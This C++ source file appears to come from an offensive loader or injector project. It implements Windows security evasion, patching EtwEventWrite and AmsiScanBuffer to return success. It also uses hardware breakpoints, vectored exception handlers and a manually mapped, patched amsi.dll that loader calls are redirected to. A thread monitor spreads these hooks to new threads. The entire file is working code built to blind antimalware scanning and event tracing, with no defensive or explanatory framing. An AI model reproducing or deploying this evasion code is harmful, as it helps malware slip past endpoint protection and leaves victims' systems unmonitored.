#include "patch.hpp"


std::vector<BYTE> ReadFileToBuffer(const std::string& filename) {
    std::ifstream file(filename, std::ios::binary | std::ios::ate);
    if (!file) {
        throw std::runtime_error("Failed to open file");
    }

    std::streamsize size = file.tellg();
    file.seekg(0, std::ios::beg);

    std::vector<BYTE> buffer(size);
    file.read(reinterpret_cast<char*>(buffer.data()), size);

    return buffer;
}
bool patchRemoteETW(HANDLE hProcess) {
    // 1. Get address of EtwEventWrite from local ntdll (it will be the same in remote)
    // You can use your syscallHandler or GetProcAddress since ntdll is already loaded
    unsigned char* k = helperHandler.getNtdll();
    hProcess = GetCurrentProcess();
    wchar_t wK[50];
    size_t convertedChars = 0;

    mbstowcs_s(&convertedChars, wK, 50, (char*)k, _TRUNCATE);
    PVOID etwAddress = syscallHandler.getFunctionAddressByHash(wK, 615043106);

    if (!etwAddress) return 1;

    unsigned char patch[] = { 0x31, 0xC0, 0xC3 }; // xor eax, eax; ret
    SIZE_T patchSize = sizeof(patch);

    std::cout << "[!] Patching ETW at: " << etwAddress << std::endl;

    // 2. Change protection to RW
    mainInjector.protectMemFlag(hProcess, etwAddress, PAGE_READWRITE, patchSize);

    // 3. Write the patch
    mainInjector.wrMem(hProcess, etwAddress, (LPVOID)patch, patchSize);

    // 4. Restore protection to RX
    mainInjector.protectMemFlag(hProcess, etwAddress, PAGE_EXECUTE_READ, patchSize);

    std::cout << "[+] ETW silenced in remote process." << std::endl;
    return 0;
}

std::vector<DWORD> patchedThreads;
PVOID g_EtwAddr;
void SetupEtwBypass() {
    unsigned char* k = helperHandler.getNtdll();

    wchar_t wK[50];
    size_t convertedChars = 0;

    mbstowcs_s(&convertedChars, wK, 50, (char*)k, _TRUNCATE);
    g_EtwAddr = syscallHandler.getFunctionAddressByHash(wK, 615043106);
    // 1. Register the VEH
    AddVectoredExceptionHandler(1, EtwHwbpHandler);

    
    // 3. Get current thread context
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    GetThreadContext(GetCurrentThread(), &ctx);

    // 4. Set the breakpoint in Dr0
    ctx.Dr0 = (DWORD64)g_EtwAddr;
    ctx.Dr7 |= (1 << 0); // Enable local breakpoint for Dr0
    ctx.Dr7 &= ~(3 << 16); // Set as "Execute" breakpoint (bits 16-17 = 00)

    // 5. Apply the context
    SetThreadContext(GetCurrentThread(), &ctx);
}

LONG WINAPI EtwHwbpHandler(PEXCEPTION_POINTERS exceptions) {
    if (exceptions->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        // Check if the RIP is at our target function (EtwEventWrite)
        if (exceptions->ExceptionRecord->ExceptionAddress == g_EtwAddr) {

            // 1. Get the return address from the stack (RSP points to it)
            DWORD64 returnAddr = *(DWORD64*)(exceptions->ContextRecord->Rsp);

            // 2. "Fake" a successful return
            exceptions->ContextRecord->Rip = returnAddr; // Skip to the caller
            exceptions->ContextRecord->Rsp += 8;         // Clean the stack
            exceptions->ContextRecord->Rax = 0;          // Success (STATUS_SUCCESS)

            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }
    return EXCEPTION_CONTINUE_SEARCH;
}


PVOID g_AmsiAddr;
typedef NTSTATUS(NTAPI* f_LdrLoadDll)(PWSTR, PULONG, PUNICODE_STRING, PVOID*);
f_LdrLoadDll oLdrLoadDll = nullptr;
PVOID g_pGetProcAddress = nullptr;
HMODULE g_ManualAmsi = nullptr;
PVOID g_pLdrLoadDll = nullptr;


LONG WINAPI AmsiUniversalHwbpHandler(PEXCEPTION_POINTERS exceptions) {
    if (exceptions->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {

        // --- INTERCEPT LDRLOADDLL ---
        if (exceptions->ExceptionRecord->ExceptionAddress == g_pLdrLoadDll) {
            PUNICODE_STRING pDllName = (PUNICODE_STRING)exceptions->ContextRecord->R8;
            if (pDllName && pDllName->Buffer && wcsstr(pDllName->Buffer, L"amsi.dll")) {
                *(PVOID*)exceptions->ContextRecord->R9 = (PVOID)g_ManualAmsi;

                exceptions->ContextRecord->Rax = 0; // STATUS_SUCCESS
                exceptions->ContextRecord->Rip = *(DWORD64*)(exceptions->ContextRecord->Rsp);
                exceptions->ContextRecord->Rsp += 8;

                // CRITICAL: Set RF (bit 16) to avoid re-triggering loop
                exceptions->ContextRecord->EFlags |= 0x10000;
                return EXCEPTION_CONTINUE_EXECUTION;
            }
        }

        // --- INTERCEPT GETPROCADDRESS ---
        if (exceptions->ExceptionRecord->ExceptionAddress == g_pGetProcAddress) {
            HMODULE hMod = (HMODULE)exceptions->ContextRecord->Rcx;
            if (hMod == g_ManualAmsi) {
                // Return our patched AmsiScanBuffer for ANY request to this module
                // This satisfies AmsiInitialize, AmsiOpenSession, etc.
                PVOID targetFunc = syscallHandler.getFunctionAddressByHashWithModule(g_ManualAmsi, 704434574);

                exceptions->ContextRecord->Rax = (DWORD64)targetFunc;
                exceptions->ContextRecord->Rip = *(DWORD64*)(exceptions->ContextRecord->Rsp);
                exceptions->ContextRecord->Rsp += 8;

                // CRITICAL: Set RF (bit 16)
                exceptions->ContextRecord->EFlags |= 0x10000;
                return EXCEPTION_CONTINUE_EXECUTION;
            }
        }

        // If we hit a single step we didn't handle, set RF and continue
        exceptions->ContextRecord->EFlags |= 0x10000;
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}




HMODULE mapAmsi() {
    auto rawAmsiBytes = ReadFileToBuffer("C:\\Windows\\System32\\amsi.dll");
    BYTE* amsiBytes = rawAmsiBytes.data();
    HMODULE amsiModule = LocalManualMap(amsiBytes);
    std::cout << "Locally mapped amsi.dll at: " << amsiModule << "\n";
	return amsiModule;
}


bool FullAmsiBypass() {
    // 1. Manually map amsi.dll into our process
    // This copy is invisible to the OS/EDR because it's not in the PEB
    g_ManualAmsi = (HMODULE)LocalManualMap(ReadFileToBuffer("C:\\Windows\\System32\\amsi.dll").data());
    if(g_ManualAmsi == NULL) {
        std::cout << "Failed to manually map amsi.dll\n";
        return false;
	}
	std::cout << "Locally mapped amsi.dll at: " << g_ManualAmsi << "\n";
    // 2. Patch our private copy's AmsiScanBuffer
    // This is safe because it's just a random allocation, not the 'real' module yet
    
    PVOID localAmsiScanBuffer = syscallHandler.getFunctionAddressByHashWithModule(g_ManualAmsi, 704434574);
    if(localAmsiScanBuffer == NULL) {
        std::cout << "Failed to find AmsiScanBuffer in manual map\n";
        return false;
	}
	std::cout << "AmsiScanBuffer address in local copy: " << localAmsiScanBuffer << "\n";
    unsigned char patch[] = { 0x31, 0xC0, 0xC3 }; // xor eax, eax; ret

    DWORD old;
    mainInjector.protectMemFlag(HANDLE(-1), localAmsiScanBuffer, PAGE_READWRITE, sizeof(patch));
    memcpy(localAmsiScanBuffer, patch, sizeof(patch));
    mainInjector.protectMemFlag(HANDLE(-1), localAmsiScanBuffer, PAGE_EXECUTE_READ, sizeof(patch));

    // 3. Set Hardware Breakpoint on LdrLoadDll
    g_pLdrLoadDll = GetProcAddress(GetModuleHandleA("ntdll.dll"), "LdrLoadDll");
    g_pGetProcAddress = GetProcAddress(GetModuleHandleA("kernel32.dll"), "GetProcAddress");
    if (g_pGetProcAddress == NULL || g_pLdrLoadDll == NULL) {
        std::cout << "Failed to get address for LdrLoadDll or GetProcAddress\n";
        return false;
    }
	std::cout << "LdrLoadDll address: " << g_pLdrLoadDll << "\n";
	std::cout << "GetProcAddress address: " << g_pGetProcAddress << "\n";
    AddVectoredExceptionHandler(1, UniversalHwbpHandler);

    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    GetThreadContext(GetCurrentThread(), &ctx);

    // Dr0 for the Loader
    ctx.Dr0 = (DWORD64)g_pLdrLoadDll;
    ctx.Dr7 |= (1 << 0);

    // Dr1 for GetProcAddress
    ctx.Dr1 = (DWORD64)g_pGetProcAddress;
    ctx.Dr7 |= (1 << 2); // Enable Dr1

    ctx.Dr7 &= ~(3 << 16); // Break on Execution for Dr0
    ctx.Dr7 &= ~(3 << 20); // Break on Execution for Dr1
    apcInjector.myNtSetContextThread(GetCurrentThread(), &ctx);
    //SetThreadContext(GetCurrentThread(), &ctx);

    std::cout << "[+] Stealth AMSI Redirect Active. ntdll bytes remain untouched.\n";
    FARPROC test = GetProcAddress(g_ManualAmsi, "AmsiScanBuffer");
	std::cout << "Testing GetProcAddress on manual map for AmsiScanBuffer: " << test << "\n";
    if (test == NULL) {
        std::cout << "CRITICAL: GetProcAddress cannot find exports in manual map!\n";
		return false;
    }
    return true;
}

HMODULE g_ManualNtdll = nullptr;
PVOID g_pNtCreateThreadEx = nullptr;
PVOID g_pEtwEventWrite = nullptr;
PVOID g_pPendingThreadHandleAddr = nullptr;

LONG WINAPI UniversalHwbpHandler(PEXCEPTION_POINTERS exceptions) {
    if (exceptions->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        PCONTEXT ctx = exceptions->ContextRecord;

        // --- 1. AMSI REDIRECTION (LdrLoadDll) ---
        if (exceptions->ExceptionRecord->ExceptionAddress == g_pLdrLoadDll) {
            PUNICODE_STRING pDllName = (PUNICODE_STRING)ctx->R8; // x64 calling convention
            if (pDllName && pDllName->Buffer && wcsstr(pDllName->Buffer, L"amsi.dll")) {
                // Redirect output handle to our manually mapped AMSI
                *(PVOID*)ctx->R9 = (PVOID)g_ManualAmsi;

                ctx->Rax = 0; // STATUS_SUCCESS
                ctx->Rip = *(DWORD64*)(ctx->Rsp); // Pop RIP from stack
                ctx->Rsp += 8;                    // Fix stack pointer

                ctx->EFlags |= 0x10000; // Set RF
                return EXCEPTION_CONTINUE_EXECUTION;
            }
        }

        // --- 2. AMSI REDIRECTION (GetProcAddress) ---
        if (exceptions->ExceptionRecord->ExceptionAddress == g_pGetProcAddress) {
            HMODULE hMod = (HMODULE)ctx->Rcx;
            if (hMod == g_ManualAmsi) {
                // Point every request to this module to our patched AmsiScanBuffer
                PVOID targetFunc = syscallHandler.getFunctionAddressByHashWithModule(g_ManualAmsi, 704434574);
                ctx->Rax = (DWORD64)targetFunc;
                ctx->Rip = *(DWORD64*)(ctx->Rsp);
                ctx->Rsp += 8;

                ctx->EFlags |= 0x10000;
                return EXCEPTION_CONTINUE_EXECUTION;
            }
        }

        // --- 3. ETW PERSISTENCE (NtCreateThreadEx) ---
        if (exceptions->ExceptionRecord->ExceptionAddress == g_pNtCreateThreadEx) {
            // Note: RCX points to the PHANDLE for the new thread. 
            // Since this is a HWBP on the START of the function, the handle isn't populated yet.
            // We save the address where the handle WILL be stored.
            g_pPendingThreadHandleAddr = (PVOID)ctx->Rcx;

            // We want to apply breakpoints to the new thread. 
            // We use a 'Single Step' trap to catch the instruction immediately after this returns.
            ctx->EFlags |= 0x100; // Set Trap Flag (TF) to trigger next instruction
        }

        // --- 4. ETW SILENCING (EtwEventWrite) ---
        if (exceptions->ExceptionRecord->ExceptionAddress == g_pEtwEventWrite) {
            ctx->Rax = 0; // Success
            ctx->Rip = *(DWORD64*)(ctx->Rsp);
            ctx->Rsp += 8;

            ctx->EFlags |= 0x10000;
            return EXCEPTION_CONTINUE_EXECUTION;
        }

        // --- 5. POST-THREAD CREATION LOGIC (Trap Flag Trigger) ---
        // If we hit a step and we have a pending handle address, it means NtCreateThreadEx just finished
        if (g_pPendingThreadHandleAddr != nullptr) {
            HANDLE hNewThread = *(PHANDLE)g_pPendingThreadHandleAddr;
            if (hNewThread) {
                CONTEXT childCtx = { 0 };
                childCtx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

                // Copy current thread's debug setup to the child
                childCtx.Dr0 = ctx->Dr0;
                childCtx.Dr1 = ctx->Dr1;
                childCtx.Dr2 = ctx->Dr2;
                childCtx.Dr3 = ctx->Dr3;
                childCtx.Dr7 = ctx->Dr7;

                // Apply to the newly spawned thread
                apcInjector.myNtSetContextThread(hNewThread, &childCtx);
            }
            g_pPendingThreadHandleAddr = nullptr; // Reset
        }

        ctx->EFlags |= 0x10000; // Always set RF to avoid infinite loop
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

bool FullEtwBypass() {
    unsigned char* k = helperHandler.getNtdll();
    
    wchar_t wK[50];
    size_t convertedChars = 0;

    mbstowcs_s(&convertedChars, wK, 50, (char*)k, _TRUNCATE);
    // 1. Get targets (Ideally use your syscallHandler to get these from your manual map)
    g_pNtCreateThreadEx = syscallHandler.getFunctionAddressByHash(wK, 3406569776);
    g_pEtwEventWrite = syscallHandler.getFunctionAddressByHash(wK, 615043106);

    if (!g_pNtCreateThreadEx || !g_pEtwEventWrite) return false;

    // current context for dr0 and dr1
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    GetThreadContext(GetCurrentThread(), &ctx);

    // ETW hooks on dr2 and Dr3
    ctx.Dr2 = (DWORD64)g_pNtCreateThreadEx;
    ctx.Dr7 |= (1 << 4); // Enable Dr2 (L2 local)

    ctx.Dr3 = (DWORD64)g_pEtwEventWrite;
    ctx.Dr7 |= (1 << 6); // Enable Dr3 (L3 local)

    // Ensure they break on EXECUTION (00 in bits 24-31 for Dr2/Dr3)
    ctx.Dr7 &= ~(3 << 24); // Dr2 condition = Execute
    ctx.Dr7 &= ~(3 << 28); // Dr3 condition = Execute

    // 4. Apply to current thread
    apcInjector.myNtSetContextThread(GetCurrentThread(), &ctx);

    std::cout << "[+] ETW Persistence Active on Dr2/Dr3\n";
    return true;
}



bool AmsiPatchGivenModule(HMODULE amsi, DWORD hash ) {
	HANDLE localProcess = GetCurrentProcess();
    PVOID amsiScanBuff = syscallHandler.getFunctionAddressByHashWithModule(amsi, hash);
    unsigned char patch[] = { 0x31, 0xC0, 0xC3 }; // xor eax, eax; ret
    SIZE_T patchSize = sizeof(patch);

    std::cout << "[!] Patching AmsiScanBuffer at: " << amsiScanBuff << std::endl;

    // Change protection to RW
    mainInjector.protectMemFlag(localProcess, amsiScanBuff, PAGE_READWRITE, patchSize);

    //Write the patch
    mainInjector.wrMem(localProcess, amsiScanBuff, (LPVOID)patch, patchSize);

    //Restore protection to RX
    mainInjector.protectMemFlag(localProcess, amsiScanBuff, PAGE_EXECUTE_READ, patchSize);
    std::cout << "[+] Amsi silenced in given module" << std::endl;
    return 0;
}
void SetupAMSIBypass() {
	


    HMODULE amsiModule = LoadLibraryW(L"amsi.dll");
    
    g_AmsiAddr = syscallHandler.getFunctionAddressByHashWithModule(amsiModule, 704434574);
	std::cout << "AmsiScanBuffer address: " << g_AmsiAddr << "\n";
    // 1. Register the VEH
    AddVectoredExceptionHandler(1, AmsiHwbpHandler);
    patchedThreads.push_back(GetCurrentThreadId());

    // 3. Get current thread context
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    GetThreadContext(GetCurrentThread(), &ctx);

    // 4. Set the breakpoint in Dr0
    ctx.Dr0 = (DWORD64)g_AmsiAddr;
    ctx.Dr7 |= (1 << 0); // Enable local breakpoint for Dr0
    ctx.Dr7 &= ~(3 << 16); // Set as "Execute" breakpoint (bits 16-17 = 00)

    // 5. Apply the context
    SetThreadContext(GetCurrentThread(), &ctx);
    std::thread(MonitorThreads).detach();

}
LONG WINAPI AmsiHwbpHandler(PEXCEPTION_POINTERS exceptions) {
    if (exceptions->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        // Check if the RIP is at our target function (EtwEventWrite)
        if (exceptions->ExceptionRecord->ExceptionAddress == g_AmsiAddr) {

            // 1. Get the return address from the stack (RSP points to it)
            DWORD64 returnAddr = *(DWORD64*)(exceptions->ContextRecord->Rsp);

            // 2. "Fake" a successful return
            exceptions->ContextRecord->Rip = returnAddr; // Skip to the caller
            exceptions->ContextRecord->Rsp += 8;         // Clean the stack
            exceptions->ContextRecord->Rax = 0;          // Success (STATUS_SUCCESS)

            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }
    return EXCEPTION_CONTINUE_SEARCH;
};



void ApplyHwBpToThread(DWORD tid) {
    HANDLE hThread = OpenThread(
        THREAD_SUSPEND_RESUME |
        THREAD_GET_CONTEXT |
        THREAD_SET_CONTEXT,
        FALSE,
        tid
    );

    if (!hThread) return;

    SuspendThread(hThread);

    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    if (GetThreadContext(hThread, &ctx)) {
        ctx.Dr0 = (DWORD64)g_EtwAddr;
        ctx.Dr7 |= 1;
        ctx.Dr7 &= ~(3 << 16);

        SetThreadContext(hThread, &ctx);
    }

    ResumeThread(hThread);
    CloseHandle(hThread);
}






void MonitorThreads() {
    while (true) {
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if (snap == INVALID_HANDLE_VALUE) continue;

        THREADENTRY32 te;
        te.dwSize = sizeof(te);

        if (Thread32First(snap, &te)) {
            do {
                if (te.th32OwnerProcessID == GetCurrentProcessId()) {

                    // Check if TID is already in our vector
                    auto it = std::find(patchedThreads.begin(), patchedThreads.end(), te.th32ThreadID);

                    // If it points to end, it's a new thread
                    if (it == patchedThreads.end()) {
                        ApplyHwBpToThread(te.th32ThreadID);
                        patchedThreads.push_back(te.th32ThreadID);
                    }
                }
            } while (Thread32Next(snap, &te));
        }

        CloseHandle(snap);
        Sleep(10);
    }
}